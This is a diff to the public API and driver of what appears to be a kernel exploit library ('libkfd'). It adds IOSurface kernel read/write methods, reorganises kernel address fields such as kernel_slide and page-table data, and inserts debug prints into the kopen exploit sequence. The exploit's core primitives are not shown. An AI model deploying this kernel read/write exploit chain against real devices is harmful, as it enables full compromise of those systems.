@@ -13,7 +13,6 @@
 #define CONFIG_TIMER 1
 
 #include "libkfd/common.h"
-#include "fun.h"
 
 /*
  * The public API of libkfd.
@@ -27,11 +26,13 @@ enum puaf_method {
 enum kread_method {
     kread_kqueue_workloop_ctl,
     kread_sem_open,
+    kread_IOSurface,
 };
 
 enum kwrite_method {
     kwrite_dup,
     kwrite_sem_open,
+    kwrite_IOSurface,
 };
 
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
@@ -60,6 +61,20 @@ struct info {
         u64 maxfilesperproc;
     } env;
     struct {
+        u64 kernel_slide;
+        u64 gVirtBase;
+        u64 gPhysBase;
+        u64 gPhysSize;
+        struct {
+            u64 pa;
+            u64 va;
+        } ttbr[2];
+        struct ptov_table_entry {
+            u64 pa;
+            u64 va;
+            u64 len;
+        } ptov_table[8];
+
         u64 current_map;
         u64 current_pmap;
         u64 current_proc;
@@ -70,24 +85,11 @@ struct info {
         u64 kernel_pmap;
         u64 kernel_proc;
         u64 kernel_task;
-    } kaddr;
+    } kernel;
 };
 
 struct perf {
     u64 kernelcache_index;
-    u64 kernel_slide;
-    u64 gVirtBase;
-    u64 gPhysBase;
-    u64 gPhysSize;
-    struct {
-        u64 pa;
-        u64 va;
-    } ttbr[2];
-    struct ptov_table_entry {
-        u64 pa;
-        u64 va;
-        u64 len;
-    } ptov_table[8];
     struct {
         u64 kaddr;
         u64 paddr;
@@ -169,16 +171,6 @@ void kfd_free(struct kfd* kfd)
     bzero_free(kfd, sizeof(struct kfd));
 }
 
-void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
-{
-    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
-}
-
-void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
-{
-    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
-}
-
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
     timer_start();
@@ -188,19 +180,34 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     assert(puaf_pages >= puaf_pages_min);
     assert(puaf_pages <= puaf_pages_max);
     assert(puaf_method <= puaf_smith);
-    assert(kread_method <= kread_sem_open);
-    assert(kwrite_method <= kwrite_sem_open);
+    assert(kread_method <= kread_IOSurface);
+    assert(kwrite_method <= kwrite_IOSurface);
 
     struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
     puaf_run(kfd);
     krkw_run(kfd);
     info_run(kfd);
+    printf("0000\n");
+    usleep(100000);
     perf_run(kfd);
-    
+    printf("1111\n");
+    usleep(100000);
     puaf_cleanup(kfd);
+    printf("2222\n");
+    usleep(100000);
 
     timer_end();
     return (u64)(kfd);
+}
+
+void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
+{
+    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
+}
+
+void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
+{
+    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
 }
 
 void kclose(u64 kfd)
